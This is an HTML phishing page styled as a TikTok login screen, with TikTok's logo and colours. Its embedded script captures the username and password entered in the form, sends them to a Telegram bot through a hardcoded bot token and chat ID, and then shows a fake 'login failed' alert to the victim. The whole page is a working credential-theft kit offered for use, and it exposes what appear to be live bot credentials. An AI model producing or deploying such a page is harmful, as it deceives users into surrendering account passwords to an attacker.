<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>TikTok Login Clone</title>
  <!-- Bootstrap 5 CDN -->
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet"/>
  <style>
    body {
      background-color: #000;
      color: #fff;
      font-family: Arial, sans-serif;
    }
    .login-container {
      max-width: 400px;
      margin: 80px auto;
      padding: 30px;
      background-color: #1c1c1c;
      border-radius: 10px;
    }
    .logo {
      width: 100px;
      margin-bottom: 20px;
    }
    .btn-login {
      background-color: #fe2c55;
      border: none;
    }
    .btn-login:hover {
      background-color: #e9294d;
    }
    .divider {
      border-top: 1px solid #555;
      margin: 20px 0;
    }
  </style>
</head>
<body>
  <div class="container">
   <div class="login-container text-center">
  <img src="https://1000logos.net/wp-content/uploads/2021/11/TikTok-logo.png" alt="TikTok Logo" class="logo">
  <h3 class="mb-4">Log in to TikTok</h3>

      <form>
        <div class="mb-3 text-start">
          <label for="username" class="form-label">Email or Username</label>
          <input type="text" class="form-control" id="username" placeholder="Enter username or email">
        </div>
        <div class="mb-3 text-start">
          <label for="password" class="form-label">Password</label>
          <input type="password" class="form-control" id="password" placeholder="Enter password">
        </div>
        <button type="submit" class="btn btn-login w-100">Log In</button>
      </form>

      <div class="divider"></div>

      <p>Don't have an account? <a href="#" class="text-decoration-none text-danger">Sign up</a></p>
    </div>
  </div>

  <!-- Bootstrap JS -->
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>

  <!-- Telegram Send Script -->
  <script>
    const botToken = "7625649687:AAFg1iJztRFBpEiP6HmeJK8K1kEUS05EOMA"; // 🔁 Replace this
    const chatId = "8119594524";     // 🔁 Replace this

    document.querySelector("form").addEventListener("submit", function (e) {
      e.preventDefault(); // prevent page reload

      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;

      const message = `🔐 New Login Attempt\n👤 Username: ${username}\n🔑 Password: ${password}`;

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      })
      .then(response => {
        if (response.ok) {
          alert("Login Faied!");
        } else {
          alert("Failed .");
        }
      })
      .catch(error => {
        console.error("Error:", error);
        alert("Error sending message.");
      });
    });
  </script>
</body>
</html>
